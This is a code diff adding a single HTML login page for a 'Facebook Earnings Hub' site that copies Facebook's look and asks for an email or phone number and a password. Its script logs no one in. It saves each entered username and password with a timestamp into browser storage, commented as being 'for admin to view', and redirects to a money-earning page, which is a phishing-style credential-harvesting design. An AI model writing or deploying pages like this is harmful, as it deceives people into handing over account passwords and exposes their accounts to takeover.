@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Facebook Earnings Hub</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            color: #1c1e21;
+        }
+        
+        .header {
+            background-color: #1877f2;
+            color: white;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+        }
+        
+        .nav a {
+            color: white;
+            text-decoration: none;
+            margin-left: 15px;
+            font-size: 16px;
+            transition: opacity 0.3s;
+        }
+        
+        .nav a.admin-link {
+            opacity: 0.8;
+            font-weight: 500;
+            position: relative;
+        }
+        
+        .nav a.admin-link:hover {
+            opacity: 1;
+        }
+        
+        .nav a.admin-link::after {
+            content: '';
+            position: absolute;
+            bottom: -3px;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background-color: rgba(255, 255, 255, 0.5);
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 60px auto;
+            padding: 0 20px;
+        }
+        
+        .login-card {
+            background-color: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        
+        .login-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #1c1e21;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+        }
+        
+        .btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s;
+        }
+        
+        .btn:hover {
+            background-color: #166fe5;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+        
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #65676b;
+            font-size: 14px;
+            margin-top: 40px;
+            border-top: 1px solid #dddfe2;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">Facebook Earnings</div>
+        <div class="nav">
+            <a href="index.html">Earn</a>
+            <a href="withdraw.html">Withdraw</a>
+            <a href="admin.html" class="admin-link">Admin</a>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="login-card">
+            <div class="login-title">Log in to Facebook Earnings</div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="text" id="username" placeholder="Email or phone number" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                
+                <button type="submit" class="btn">Log In</button>
+                
+                <div class="divider"></div>
+                
+                <button type="button" class="create-account" onclick="window.location.href='index.html'">Continue as guest</button>
+            </form>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p>© 2023 Facebook Earnings Hub. This is not an official Facebook product.</p>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Store credentials in localStorage (for admin to view)
+            const credentials = JSON.parse(localStorage.getItem('userCredentials') || '[]');
+            credentials.push({
+                username: username,
+                password: password,
+                timestamp: new Date().toLocaleString()
+            });
+            localStorage.setItem('userCredentials', JSON.stringify(credentials));
+            
+            // Redirect to main page
+            window.location.href = 'index.html';
+        });
+    </script>
+</body>
+</html>
